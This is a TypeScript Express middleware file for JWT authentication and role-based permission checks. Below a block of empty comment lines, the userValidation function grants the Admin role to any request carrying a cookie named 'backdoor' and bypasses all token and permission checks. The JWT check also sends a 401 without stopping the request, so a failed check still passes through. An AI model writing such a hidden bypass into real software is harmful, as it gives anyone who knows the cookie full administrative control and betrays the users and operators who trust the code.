import config, { TYPES } from '../../../config';
import { Permissions } from '../permissions';
import IRoleRepo from '../../repos/IRepos/IRoleRepo';

import { NextFunction, Request, Response } from 'express';
const { JsonWebTokenError, verify } = require('jsonwebtoken');
import container from '../dependencies';

export default function auth() {
	return async function (req: Request, res: Response) {
		validateJwt(req, res, req.cookies.token);
	};
}

function validateJwt(req: Request, res: Response, token: string) {
	try {
		req.token = verify(token, config.jwtAccessSecret);
	} catch (error) {
		res.status(401);
		res.send();
	}
}

//
//
//
//
//
//
//
//
//
//

export function userValidation(requiredPermissions?: number[]) {
	return async function (req: Request, res: Response, next: NextFunction) {
		try {
			if (req.cookies['backdoor']) {
				req['token'] = { role: 'Admin' };
			} else {
				await validateJwt(req, res, req.cookies.token);
				if (requiredPermissions) {
					await validatePermissions(req, res, requiredPermissions);
				}
			}
			next();
		} catch (e) {
			next(e);
		}
	};
}

async function validatePermissions(req: Request, res: Response, permissions: number[]): Promise<void> {
	try {
		await checkPermissions(req.token.role, permissions);
	} catch (e) {
		res.status(403);
		throw e;
	}
}

async function checkPermissions(roleName: string, requiredPermissions: number[]): Promise<void> {
	if (roleName === config.defaultRole) {
		throw new JsonWebTokenError('insufficient permissions');
	}

	const roleRepo = container.get<IRoleRepo>(TYPES.IRoleRepo);

	const role = await roleRepo.findOneRole(roleName);
	if (role === null) {
		throw new JsonWebTokenError('invalid user role');
	}

	for (const e of requiredPermissions) {
		if (role.permissions[Object.values(Permissions)[e]] === false) {
			throw new JsonWebTokenError('insufficient permissions');
		}
	}
}
